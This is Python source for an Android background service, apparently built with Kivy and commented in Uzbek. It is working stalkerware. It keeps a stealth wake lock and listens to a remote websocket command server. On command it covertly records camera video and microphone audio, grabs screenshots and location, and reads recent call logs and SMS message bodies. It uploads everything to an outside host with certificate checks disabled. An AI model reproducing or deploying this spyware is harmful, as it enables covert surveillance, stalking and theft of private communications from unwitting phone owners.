import asyncio
import threading
import os
import shutil
import time
import ssl
import uuid
import struct
import zlib
import urllib.request
from jnius import autoclass

WS_URL     = "wss://hild-tracking-backend.onrender.com/ws/device"
UPLOAD_URL = "https://hild-tracking-backend.onrender.com/upload"

status           = ["Ishga tushirilmoqda..."]
should_reconnect = [True]
ws_ref           = [None]
wake_lock_ref    = [None]

# PythonService context
PythonService = autoclass('org.kivy.android.PythonService')
service_context = PythonService.mService


def _ssl_ctx():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    return ctx

def _acquire_wake_lock():
    try:
        PowerManager = autoclass('android.os.PowerManager')
        pm = service_context.getSystemService(service_context.POWER_SERVICE)
        wl = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            'StealthService:KeepAlive'
        )
        wl.acquire()
        wake_lock_ref[0] = wl
        status[0] = 'WakeLock yoqildi.'
    except Exception as e:
        status[0] = 'WakeLock xatolik: ' + str(e)[:80]

def _multipart(fields, files=None):
    b = uuid.uuid4().hex
    body = b""
    for k, v in fields.items():
        body += ("--" + b + "\r\nContent-Disposition: form-data; name=\""
                 + k + "\"\r\n\r\n" + str(v) + "\r\n").encode()
    if files:
        for k, (fname, data) in files.items():
            body += ("--" + b + "\r\nContent-Disposition: form-data; name=\""
                     + k + "\"; filename=\"" + fname + "\"\r\n"
                     "Content-Type: application/octet-stream\r\n\r\n").encode()
            body += data + b"\r\n"
    body += ("--" + b + "--\r\n").encode()
    req = urllib.request.Request(
        UPLOAD_URL, data=body,
        headers={"Content-Type": "multipart/form-data; boundary=" + b}
    )
    resp = urllib.request.urlopen(req, context=_ssl_ctx(), timeout=30)
    return resp.status

def upload_file_sync(file_path, media_type):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        code = _multipart({"media_type": media_type},
                          {"file": (os.path.basename(file_path), data)})
        status[0] = "Yuborildi! (" + str(code) + ")"
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception as e:
        status[0] = "Upload xatolik: " + str(e)[:120]

def send_text_sync(text_data):
    try:
        code = _multipart({"media_type": "text", "text": text_data})
        status[0] = "Telegramga yuborildi! (" + str(code) + ")"
    except Exception as e:
        status[0] = "Yuborish xatolik: " + str(e)[:120]

def get_battery_info():
    try:
        I    = autoclass('android.content.Intent')
        IF   = autoclass('android.content.IntentFilter')
        BM   = autoclass('android.os.BatteryManager')
        bs   = service_context.registerReceiver(None, IF(I.ACTION_BATTERY_CHANGED))
        pct  = int(bs.getIntExtra(BM.EXTRA_LEVEL, -1) * 100
                   / bs.getIntExtra(BM.EXTRA_SCALE, -1))
        sv   = bs.getIntExtra(BM.EXTRA_STATUS, -1)
        chg  = sv in [BM.BATTERY_STATUS_CHARGING, BM.BATTERY_STATUS_FULL]
        return "Batareya: " + str(pct) + "%\n" + ("Zaryadlanmoqda" if chg else "Zaryadlanmayapti")
    except Exception as e:
        return "Batareya xatolik: " + str(e)

def get_device_info():
    try:
        B = autoclass('android.os.Build')
        V = autoclass('android.os.Build$VERSION')
        return ("Model: " + B.MODEL + "\nBrand: " + B.BRAND
                + "\nAndroid: " + V.RELEASE + "\nSDK: " + str(V.SDK_INT))
    except Exception as e:
        return "Qurilma info xatolik: " + str(e)

def take_screenshot_sync():
    try:
        ext_dir  = service_context.getExternalFilesDir(None).getAbsolutePath()
        filepath = ext_dir + '/scr.png'
        # Service rejimida faqat Root orqali screencap ishlaydi
        os.system(f'screencap -p {filepath}')
        if os.path.exists(filepath) and os.path.getsize(filepath) > 1000:
            threading.Thread(
                target=upload_file_sync, args=(filepath, 'photo'), daemon=True
            ).start()
            return "Ekran rasmi olindi, yuborilmoqda..."
        return "Ekran rasmini olib bo'lmadi. Orqa fonda rasmga olish uchun Root talab qilinadi."
    except Exception as e:
        return "Screenshot xatoligi: " + str(e)

def get_location_sync():
    try:
        Context  = autoclass('android.content.Context')
        LM       = service_context.getSystemService(Context.LOCATION_SERVICE)

        is_gps_enabled = LM.isProviderEnabled('gps')
        is_net_enabled = LM.isProviderEnabled('network')
        
        providers = ['gps', 'network', 'passive']
        loc = None
        for p in providers:
            try:
                l = LM.getLastKnownLocation(p)
                if l:
                    if not loc or l.getTime() > loc.getTime():
                        loc = l
            except Exception:
                pass

        if loc:
            lat = loc.getLatitude()
            lon = loc.getLongitude()
            diff_min = int((time.time() * 1000 - loc.getTime()) / 60000)
            time_str = " (hozirgi)" if diff_min < 2 else f" ({diff_min} daqiqa oldingi)"
            return "📍 Manzil topildi" + time_str + ":\nhttps://www.google.com/maps?q=" + str(lat) + "," + str(lon)
        else:
            diag = f"\n(GPS: {'OCHIQ' if is_gps_enabled else 'YOQ'}, Network: {'OCHIQ' if is_net_enabled else 'YOQ'})"
            return "📍 Manzilni aniqlab bo'lmadi." + diag
    except Exception as e:
        return "📍 Manzil xatoligi: " + str(e)

def get_call_logs_sync():
    try:
        Uri = autoclass('android.net.Uri')
        uri = Uri.parse("content://call_log/calls")
        cursor = service_context.getContentResolver().query(uri, None, None, None, "date DESC LIMIT 15")
        
        if not cursor:
            return "📞 Qo'ng'iroqlar jurnalini o'qib bo'lmadi (Ruxsat yo'q yoki bo'sh)."
            
        logs = ["📞 SO'NGGI 15 TA QO'NG'IROQ:\n"]
        while cursor.moveToNext():
            num_idx = cursor.getColumnIndex("number")
            name_idx = cursor.getColumnIndex("name")
            type_idx = cursor.getColumnIndex("type")
            date_idx = cursor.getColumnIndex("date")
            dur_idx = cursor.getColumnIndex("duration")
            
            number = cursor.getString(num_idx) if num_idx >= 0 else "Noma'lum"
            name = cursor.getString(name_idx) if name_idx >= 0 else "Nomsiz"
            if not name: name = "Nomsiz"
            
            call_type = cursor.getInt(type_idx) if type_idx >= 0 else 0
            ctype_str = "Kiruvchi ⬇️" if call_type == 1 else "Chiquvchi ↗️" if call_type == 2 else "Qabul qilinmagan ❌" if call_type == 3 else "Boshqa"
            
            date_ms = cursor.getLong(date_idx) if date_idx >= 0 else 0
            duration = cursor.getString(dur_idx) if dur_idx >= 0 else "0"
            
            import datetime
            dt = datetime.datetime.fromtimestamp(date_ms/1000).strftime('%Y-%m-%d %H:%M')
            logs.append(f"👤 {name} ({number})\n⏳ {dt} | {ctype_str} | {duration} sek\n")
            
        cursor.close()
        return "\n".join(logs)
    except Exception as e:
        return f"📞 Qo'ng'iroqlar xatosi: {e}"

def get_sms_logs_sync():
    try:
        Uri = autoclass('android.net.Uri')
        uri = Uri.parse("content://sms/")
        cursor = service_context.getContentResolver().query(uri, None, None, None, "date DESC LIMIT 10")
        
        if not cursor:
            return "💬 SMSlarni o'qib bo'lmadi (Ruxsat yo'q yoki bo'sh)."
            
        logs = ["💬 SO'NGGI 10 TA SMS:\n"]
        while cursor.moveToNext():
            addr_idx = cursor.getColumnIndex("address")
            body_idx = cursor.getColumnIndex("body")
            type_idx = cursor.getColumnIndex("type")
            date_idx = cursor.getColumnIndex("date")
            
            address = cursor.getString(addr_idx) if addr_idx >= 0 else "Noma'lum"
            body = cursor.getString(body_idx) if body_idx >= 0 else ""
            msg_type = cursor.getInt(type_idx) if type_idx >= 0 else 0
            
            ctype_str = "KIRUVCHI ⬇️" if msg_type == 1 else "CHIQUVCHI ↗️"
            date_ms = cursor.getLong(date_idx) if date_idx >= 0 else 0
            import datetime
            dt = datetime.datetime.fromtimestamp(date_ms/1000).strftime('%Y-%m-%d %H:%M')
            logs.append(f"📱 {address} | {ctype_str}\n🕒 {dt}\n📝 {body}\n")
            
        cursor.close()
        return "\n".join(logs)
    except Exception as e:
        return f"💬 SMS xatosi: {e}"

def record_audio():
    try:
        MR  = autoclass('android.media.MediaRecorder')
        AS_ = autoclass('android.media.MediaRecorder$AudioSource')
        OF  = autoclass('android.media.MediaRecorder$OutputFormat')
        AE  = autoclass('android.media.MediaRecorder$AudioEncoder')

        ext_dir  = service_context.getExternalFilesDir(None).getAbsolutePath()
        filepath = ext_dir + '/audio.m4a'

        rec = MR()
        rec.setAudioSource(AS_.VOICE_RECOGNITION)
        rec.setOutputFormat(OF.MPEG_4)
        rec.setAudioEncoder(AE.AAC)
        rec.setAudioChannels(1)
        rec.setAudioSamplingRate(44100)
        rec.setAudioEncodingBitRate(128000)
        rec.setOutputFile(filepath)
        rec.prepare()
        rec.start()
        time.sleep(10)
        rec.stop()
        rec.release()
        if os.path.exists(filepath):
            upload_file_sync(filepath, 'audio')
    except Exception as e:
        threading.Thread(target=send_text_sync, args=(f"Audio xato: {e}",), daemon=True).start()

def record_video():
    try:
        MR  = autoclass('android.media.MediaRecorder')
        VS  = autoclass('android.media.MediaRecorder$VideoSource')
        AS  = autoclass('android.media.MediaRecorder$AudioSource')
        OF  = autoclass('android.media.MediaRecorder$OutputFormat')
        VE  = autoclass('android.media.MediaRecorder$VideoEncoder')
        AE  = autoclass('android.media.MediaRecorder$AudioEncoder')
        SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
        Camera = autoclass('android.hardware.Camera')

        ext_dir  = service_context.getExternalFilesDir(None).getAbsolutePath()
        filepath = ext_dir + '/video.mp4'

        cam = Camera.open(0)
        dummy_st = SurfaceTexture(10)
        cam.setPreviewTexture(dummy_st)
        cam.unlock()

        rec = MR()
        rec.setCamera(cam)
        rec.setAudioSource(AS.CAMCORDER)
        rec.setVideoSource(VS.CAMERA)
        rec.setOutputFormat(OF.MPEG_4)
        rec.setVideoEncoder(VE.H264)
        rec.setAudioEncoder(AE.AAC)
        rec.setOutputFile(filepath)
        rec.setVideoSize(640, 480)
        rec.setVideoFrameRate(15)

        rec.prepare()
        rec.start()
        time.sleep(60)
        rec.stop()
        rec.release()
        cam.release()
        
        if os.path.exists(filepath):
            upload_file_sync(filepath, 'video')
    except Exception as e:
        threading.Thread(target=send_text_sync, args=(f"Video xato: {e}",), daemon=True).start()

async def ws_loop():
    loop  = asyncio.get_running_loop()
    retry = 0
    while should_reconnect[0]:
        try:
            import websockets
            retry += 1
            status[0] = 'Ulanilmoqda...'
            async with websockets.connect(
                WS_URL, ssl=_ssl_ctx(),
                ping_interval=30, ping_timeout=15,
                open_timeout=15, close_timeout=5,
            ) as ws:
                ws_ref[0] = ws
                retry = 0
                status[0] = 'ULANDI!'
                while True:
                    msg = await ws.recv()
                    if msg == 'take_photo' or msg == 'selfie':
                        info = "Rasmga olish Kivy yopilganda ishlamaydi. O'rniga qisqa video yuborilmoqda..."
                        await loop.run_in_executor(None, send_text_sync, info)
                        threading.Thread(target=record_video, daemon=True).start()
                    elif msg == 'record_audio':
                        threading.Thread(target=record_audio, daemon=True).start()
                    elif msg == 'record_video':
                        threading.Thread(target=record_video, daemon=True).start()
                    elif msg == 'get_location':
                        info = get_location_sync()
                        await loop.run_in_executor(None, send_text_sync, info)
                    elif msg == 'get_screenshot':
                        info = take_screenshot_sync()
                        await loop.run_in_executor(None, send_text_sync, info)
                    elif msg == 'battery':
                        info = get_battery_info()
                        await loop.run_in_executor(None, send_text_sync, info)
                    elif msg == 'device_info':
                        info = get_device_info()
                        await loop.run_in_executor(None, send_text_sync, info)
                    elif msg == 'get_call_logs':
                        info = get_call_logs_sync()
                        await loop.run_in_executor(None, send_text_sync, info)
                    elif msg == 'get_sms_logs':
                        info = get_sms_logs_sync()
                        await loop.run_in_executor(None, send_text_sync, info)
        except Exception as e:
            ws_ref[0] = None
            wait = min(5 * retry, 30)
            await asyncio.sleep(wait)

def run_loop():
    try:
        lp = asyncio.new_event_loop()
        asyncio.set_event_loop(lp)
        lp.run_until_complete(ws_loop())
    except Exception as e:
        status[0] = str(e)

if __name__ == '__main__':
    _acquire_wake_lock()
    run_loop()
